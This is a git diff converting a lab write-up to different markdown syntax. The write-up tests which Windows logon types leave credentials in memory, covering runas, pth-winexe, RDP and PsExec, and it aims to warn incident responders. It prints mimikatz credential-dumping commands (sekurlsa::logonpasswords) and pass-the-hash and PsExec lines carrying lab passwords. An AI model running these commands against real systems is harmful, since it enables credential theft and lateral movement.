@@ -12,52 +12,47 @@ Tested against Microsoft Windows 7 Professional 6.1.7601 Service Pack 1 Build 76
 
 Let's make a base password dump using mimikatz on the victim system to see what we can get before we start logging on to it using other methods such as runas, psexec, etc. To test this, the victim system was rebooted and no other attempts to login to the system were made except for the interactive logon to get access to the console:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
 ```
-{% endcode %}
 
 Credentials were cached and got dumped by mimikatz:
 
-![](../../.gitbook/assets/pwdump-test1.png)
+![[pwdump-test1.png]]
 
 ## Interactive Logon \(2\) via runas and Local Account
 
-{% code title="responder@victim" %}
 ```csharp
+// responder@victim
 runas /user:low cmd
 ```
-{% endcode %}
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 mimikatz # sekurlsa::logonpasswords
 ```
-{% endcode %}
 
 Credentials were cached and got dumped by mimikatz:
 
-![](../../.gitbook/assets/pwdump-test2.png)
+![[pwdump-test2.png]]
 
 ## Interactive Logon \(2\) via runas and Domain Account
 
-{% code title="responder@victim" %}
 ```csharp
+// responder@victim
 runas /user:spot@offense cmd
 ```
-{% endcode %}
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 mimikatz # sekurlsa::logonpasswords
 ```
-{% endcode %}
 
 Credentials were cached and got dumped by mimikatz:
 
-![](../../.gitbook/assets/pwdump-test3.png)
+![[pwdump-test3.png]]
 
 ## New Credentials \(9\) via runas with /netonly
 
@@ -67,27 +62,25 @@ runas /user:low /netonly cmd
 
 Note that event logs show the logon of type 9 for the user `mantvydas`, although we requested to logon as the user `low`:
 
-![](../../.gitbook/assets/pwdump-runas-netonly.png)
+![[pwdump-runas-netonly.png]]
 
 Logon type 9 means that the any network connections originating from our new process will use the new credentials, which in our case are credentials of the user `low`. These credentials, get cached:
 
-![](../../.gitbook/assets/pwdump-runas-netonly-dump.png)
+![[pwdump-runas-netonly-dump.png]]
 
 ## Network Logon \(3\) with Local Account
 
 Imagine an Incident Responder is connecting to a victim system using that machine's local account remotely to inspect it for a compromise using pth-winexe:
 
-{% code title="responder@victim" %}
 ```csharp
+// responder@victim
 root@~# pth-winexe //10.0.0.2 -U back%password cmd
 ```
-{% endcode %}
 
-{% code title="attacker@victim" %}
 ```text
+// attacker@victim
 sekurlsa::logonpasswords
 ```
-{% endcode %}
 
 Mimikatz shows no credentials got stored in memory for the user `back`.
 
@@ -95,14 +88,13 @@ Mimikatz shows no credentials got stored in memory for the user `back`.
 
 Imagine an Incident Responder is connecting to a victim system using a privileged domain account remotely to inspect it for a compromise using pth-winexe, a simple SMB mount or WMI:
 
-{% code title="responder@victim" %}
 ```csharp
+// responder@victim
 root@~# pth-winexe //10.0.0.2 -U offense/spot%password cmd
 ```
-{% endcode %}
 
-{% code title="responder@victim" %}
 ```text
+// responder@victim
 PS C:\Users\spot> net use * \\10.0.0.2\test /user:offense\spotless spotless
 Drive Z: is now connected to \\10.0.0.2\test.
 
@@ -114,13 +106,11 @@ Enter the password :********
 Executing (Win32_Process)->Create()
 Method execution successful.
 ```
-{% endcode %}
 
-{% code title="attacker@victim" %}
 ```text
+// attacker@victim
 sekurlsa::logonpasswords
 ```
-{% endcode %}
 
 Mimikatz shows no credentials got stored in memory for `offense\spotless` or `offense\administrator`.
 
@@ -128,20 +118,20 @@ Mimikatz shows no credentials got stored in memory for `offense\spotless` or `of
 
 RDPing to the victim system:
 
-![](../../.gitbook/assets/pwdum-test5.png)
+![[pwdum-test5.png]]
 
 Credentials were cached and got dumped by mimikatz:
 
-![](../../.gitbook/assets/pwdump-test6.png)
+![[pwdump-test6.png]]
 
 Note that any remote logon with a graphical UI is logged as logon event type 10 and the credentials stay on the logged on system:
 
-![](../../.gitbook/assets/pwdump-logon10.png)
+![[pwdump-logon10.png]]
 
 ## PsExec From An Elevated Prompt
 
-{% code title="responder@victim" %}
 ```csharp
+// responder@victim
 .\PsExec64.exe \\10.0.0.2 cmd
 
 PsExec v2.2 - Execute processes remotely
@@ -153,9 +143,8 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32>
 ```
-{% endcode %}
 
-![](../../.gitbook/assets/pwdump-psexec-no-atlernate-credentials.png)
+![[pwdump-psexec-no-atlernate-credentials.png]]
 
 Mimikatz shows no credentials got stored in memory for `offense\spot`
 
@@ -163,21 +152,20 @@ Note how all the logon events are of type 3 - network logons and read on to the 
 
 ## PsExec + Alternate Credentials
 
-{% code title="responder@victim" %}
 ```csharp
+// responder@victim
 .\PsExec64.exe \\10.0.0.2 -u offense\spot -p password cmd
 ```
-{% endcode %}
 
 Credentials were cached and got dumped by mimikatz:
 
-![](../../.gitbook/assets/pwdump-psexec-supplied-creds.png)
+![[pwdump-psexec-supplied-creds.png]]
 
 Looking at the event logs, a logon type 2 \(interactive\) is observed amongst the network logon 3, which explains why credentials were successfully dumped in the above test:
 
-![](../../.gitbook/assets/pwdump-psexec-interactive-logon.png)
+![[pwdump-psexec-interactive-logon.png]]
 
-![](../../.gitbook/assets/pwdump-psexec-eventlog.png)
+![[pwdump-psexec-eventlog.png]]
 
 ## Observations
 
@@ -187,7 +175,7 @@ Interactive and remote interactive logons do get cached and can get easily dumpe
 
 ## References
 
-{% embed url="https://digital-forensics.sans.org/blog/2012/02/21/protecting-privileged-domain-account-safeguarding-password-hashes" %}
+[digital-forensics.sans.org/blog/2012/02/21/protecting-privileged-domain-account-safeguarding-password-hashes](https://digital-forensics.sans.org/blog/2012/02/21/protecting-privileged-domain-account-safeguarding-password-hashes)
 
 
 
